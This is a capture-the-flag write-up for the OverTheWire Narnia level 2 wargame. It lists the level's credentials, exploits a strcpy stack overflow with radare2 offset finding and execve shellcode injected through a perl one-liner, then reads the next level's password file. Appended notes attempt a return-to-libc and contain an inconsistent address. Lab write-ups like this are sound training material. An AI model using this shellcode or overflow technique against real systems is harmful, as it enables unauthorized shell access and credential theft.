# username / password
narnia2 / 5agRAXeBdG
# concept
* stack buffer overflow via binary command arguments
# method of solve
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}

```
* according to the sourcecode, the program saves the command arguments to the buf variable:
```
strcpy(buf,argv[1]);
```
* the `buf` variable is allocated 128 bytes:
```
char buf[128];
```
* that means that user input in the binary command argument that exceeds 128 characters will overflow the stack buffer and overflow into other memory addresses
* we can test how many bytes we need to send to the binary by creating a pattern out of the user input using the `ragg2` binary
```
ragg2 -P 150 -r
```
* we can feed this command's output into `radare2`'s input to debug the binary:
```
r2 -d /narnia/narnia2 AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAA
```
* then run the binary, crash it, and see what value ends up in the `eip` memory register
```
dc      # run the binary with the command arguments
dr      # examine the memory register contents
```
* we see the following hex contents in the `eip` register: `0x74414173`
* to figure out what the offset is, we can run this `ragg2` command
```
ragg2 -q 0x74414173
```
* this lets us know that the offset is `132`
* we can use the same shellcode from the previous level to get a `bash` shell on this this binary:
`\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80`
* we need to keep in mind that the length of the shellcode is `33` bytes
* in `r2`, we can see where the command argument ended up on the memory stack
```
px @ esp-150   # see the contents the 150 bytes before the esp register
```
* We can see that the first two `A` characters show up in the last portion of the `0xffffd29a` memory address
* that means we can put the a couple of `A` characters in the to fill out the `0xffffd2aa` memory address, then put shellcode in `0xffffd2aa` memory address, then fill the rest of the offset out until the `eip` register, then put the `0xffffd2aa` memory address in the `eip` register to jump to the shellcode and execute it
* so the total number of bytes we send to the binary is `2 + 33 + 97 + 4 = 136`
```
2   # 'A's
33  # shellcode
97  # padding
4   # payload (points to the shellcode)
----
136 bytes
```
* we can send this whole sequence to the binary with this perl command:
```
/narnia/narnia2 $(perl -e 'print "A" x 2 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "A" x 97 . "\xaa\xd2\xff\xff"')
```
* this gets us the bash shell. All that's left is to read the password
```
cat /etc/narnia_pass/narnia3
```


nuevo año
ssh narnia2@narnia.labs.overthewire.org
pwd: nairiepecu
To achieve a buffer overflow we need to enter 128 + 4 + 4 + 4 + 4 = 144 chars and to write over the EIP and return address.

4 bytes return address
4 bytes EIP (next instruction pointer)
4 bytes argv
4 bytes argc
128 bytes buffer


# nop sled ( 136 chars) + address to return to
$ ./narnia2 `python -c 'print "\x90"*136 + "\xff\xff\xff\xff"'`
Illegal instruction
# lets try it with gdb to findout if the eip is 0xffffffff
$ gdb ./narnia2
(gdb) r `python -c 'print "\x90"*140 + "\xff\xff\xff\xff"'` 
Program received signal SIGSEGV, Segmentation fault.
0xffffffff in ?? ()
# good, now find the address to "system" a.k.a libc
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e62e70 <system>
# reverse the address
# fix env variable SHELL=/bin/bash and find address
(gdb) x/200s $esp
0xffffdeda: "SHELL=/bin/sh"
# 0xf7e55f50  - exit,   0xffffdeda + 6 = 0xffffdee0
# EIP = 0x7fe62e70    RET_ADDR=0xf7e55f50,  ARG=0xffffdee0
`python -c 'print "\x90"*136 + "\x70\x2e\xe6\xf7" + "\x50\x5f\xe5\xf7" + "\xe0\xde\xff\xff"'`


